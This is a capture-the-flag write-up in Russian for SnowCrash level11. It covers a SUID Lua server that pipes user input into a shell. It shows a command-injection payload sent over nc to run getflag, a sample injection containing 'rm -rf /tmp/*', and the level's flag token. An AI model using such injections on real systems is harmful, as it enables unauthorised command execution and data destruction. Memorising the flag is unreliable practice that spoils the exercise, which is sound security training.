Level11
==========================

Flag
----

fa6v5ateaw21peobuub8ipe6s

* * *

Discovery
---------

### Проверка директории

    level11@SnowCrash:~$ ls -l
    total 4
    -rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua

Наблюдение: в директории находится исполняемый Lua-скрипт с SUID/SGID битами.

### Выполнение скрипта

    level11@SnowCrash:~$ ./level11.lua 
    lua: ./level11.lua:3: address already in use
    stack traceback:
            [C]: in function 'assert'
            ./level11.lua:3: in main chunk
            [C]: ?

Ошибка связана с тем, что порт 5151 уже занят.

### Анализ скрипта

    level11@SnowCrash:~$ cat ./level11.lua
    #!/usr/bin/env lua
    local socket = require("socket")
    local server = assert(socket.bind("127.0.0.1", 5151))

    function hash(pass)
      prog = io.popen("echo "..pass.." | sha1sum", "r")
      data = prog:read("\*all")
      prog:close()
      data = string.sub(data, 1, 40)
      return data
    end

    while 1 do
      local client = server:accept()
      client:send("Password: ")
      client:settimeout(60)
      local l, err = client:receive()
      if not err then
          print("trying " .. l)
          local h = hash(l)
          if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
              client:send("Erf nope..\\n");
          else
              client:send("Gz you dumb\*\\n")
          end
      end
      client:close()
    end

Описание:

*   Lua-скрипт поднимает TCP-сервер на 127.0.0.1:5151.
*   При подключении клиенту отправляется "Password: " и принимается ввод.
*   Пароль обрабатывается через sha1sum и сравнивается с заданным хэшем.
*   Успех: "Gz you dumb\*", ошибка: "Erf nope..".
*   После этого закрывает соединение и ждёт следующего клиента.

### Проблема

Команда `prog = io.popen("echo "..pass.." | sha1sum", "r")` выполняет конкатенацию пользовательского ввода напрямую в shell-команду. Нет экранирования и фильтрации → возможна инъекция команд. Пример:

    test; rm -rf /tmp/\* | sha1sum

Это классическая command injection: произвольные команды выполняются с правами пользователя, запустившего скрипт.

Use (Exploit)
-------------

### Подключение к порту 5151 и выполнение getflag

    level11@SnowCrash:~$ nc 127.0.0.1 5151
    Password: dummy; getflag > /tmp/flag
    Erf nope..

Хотя пароль неверный, команда `getflag` была выполнена через инъекцию.

### Получение флага

    level11@SnowCrash:~$ cat /tmp/flag
    Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

Флаг успешно получен.

* * *

Prevention
----------

*   Не доверять пользовательскому вводу при формировании команд для shell.
*   Использовать безопасные API вместо io.popen, например библиотеки хэширования.
*   Фильтровать и экранировать специальные символы при работе с shell.
*   Ограничить права на SUID/SGID файлы и контролировать доступ к ним.

* * *

Documentation
-------------

*   man lua
*   man nc
*   man io.popen
*   SHA1 хэширование